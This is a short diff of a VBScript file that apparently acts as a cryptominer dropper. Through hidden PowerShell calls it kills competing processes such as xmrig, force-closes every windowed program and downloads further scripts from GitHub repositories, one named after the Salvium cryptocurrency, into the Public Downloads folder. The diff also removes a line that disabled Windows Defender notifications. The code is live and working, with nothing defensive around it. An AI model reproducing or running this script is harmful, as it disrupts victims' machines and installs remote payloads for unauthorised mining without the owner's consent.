@@ -1,7 +1,6 @@
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -Command Stop-Process -Name 'cmd','powershell','xmrig','chromedriver','msedgedriver' -Force -ErrorAction SilentlyContinue", 0, True
 objShell.Run "powershell.exe -Command Get-Process | Where-Object { $_.MainWindowHandle -ne 0 } | Stop-Process -Force", 0, True
-objShell.Run "powershell.exe -Command reg add 'HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications' /v 'DisableEnhancedNotifications' /t REG_DWORD /d '1' /f", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/-/refs/heads/main/Autorun.vbs -OutFile C:\Users\Public\Downloads\Autorun.vbs", 0, True
 objShell.Run "powershell.exe -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/Salvium-SAL-/refs/heads/main/configure_system.ps1 -OutFile C:\Users\Public\Downloads\configure_system.ps1", 0, True
 WScript.Sleep 2000
